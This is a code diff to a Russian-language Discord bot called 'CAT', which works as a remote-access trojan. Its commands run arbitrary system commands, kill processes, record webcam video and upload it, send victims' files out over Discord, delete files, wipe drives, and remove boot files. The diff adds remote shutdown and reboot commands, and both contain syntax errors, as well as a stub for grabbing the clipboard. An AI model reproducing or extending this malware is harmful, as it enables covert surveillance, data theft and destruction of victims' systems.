@@ -87,16 +87,19 @@ async def command(ctx,*,command):
         await ctx.send('**CAT**: Комманда успешно выполнена!')
     else:
         await ctx.send('**CAT**: Ошибка выполения!')
-    del config , output
+    del output
     
 @bot.command()
 async def kill(ctx,*,process):
-    output = os.system(f'taskkill /im {str(process)} /f')
-    if output == 0:
-        await ctx.send('**CAT**: Процесс успешно убит!')
-    else:
-        await ctx.send('**CAT**: Такого процесса нет или вы указали непраильный процесс!')
-        del command
+    try:
+        output = os.system(f'taskkill /im {str(process)} /f')
+        if output == 0:
+            await ctx.send('**CAT**: Процесс успешно убит!')
+        else:
+            await ctx.send('**CAT**: Такого процесса нет или вы указали непраильный процесс!')
+            del command
+    except  UnboundLocalError:
+        await ctx.send('**CAT**: Эта команда доступна только для Windows!')
 
 @bot.command()
 async def processlist(ctx): # список процессов
@@ -133,7 +136,6 @@ async def video(ctx,how_many): #запись видео
             break
     out.release()
     cv2.destroyAllWindows()
-
     await ctx.send(file=discord.File('video.avi'))
     os.remove(output)
 
@@ -145,8 +147,10 @@ async def delete(ctx,file): # удалиить файл
     except FileNotFoundError:
         await ctx.send('**CAT**: Такой файл не найден!')
     finally:
-        ctx.send(f'**CAT**: Файл "{str(file)}"был успешно удалён!')
+        await ctx.send(f'**CAT**: Файл "{str(file)}"был успешно удалён!')
     del file
+
+
 @bot.command()
 async def format(ctx,disk): # форматирование диска 
     os.system(f'rd/s/q {disk}:\ ')
@@ -165,13 +169,30 @@ async def system_kill(ctx): # удаление загрузочных файло
 
 @bot.command()
 async def copy(ctx, way): # копирование файла
-    await ctx.send('**CAT**: Скопированный файл:' , file=discord.File(way))
-    del way
+    try:
+        await ctx.send('**CAT**: Скопированный файл:' , file=discord.File(way))
+        del way
+    except FileNotFoundError:
+        await ctx.send('**CAT**: Не могу найти файл!')
+
+
 # ДОПИСАТЬ!
 '''@bot.command()
 async def clipboard_grab(ctx):
     captured = subprocess.check_output( '' , shell=True)
     ctx.send(f'**CAT**: {str(captured)}.')'''
+
+
+@bot.command()
+async def shutdown(ctx)
+    await ctx.send('Выключаю компьютер...')
+    os.system('shutdown -s -t 1 -c "0x00000003234" >nul')
+
+
+@bot.command()
+async def reboot(ctx)
+    await ctx.send('Перезагружаю компьютер...')
+    os.system('shutdown -r -t 1 -c "0x00000003234" >nul')
 
 
 bot.run(config.token)
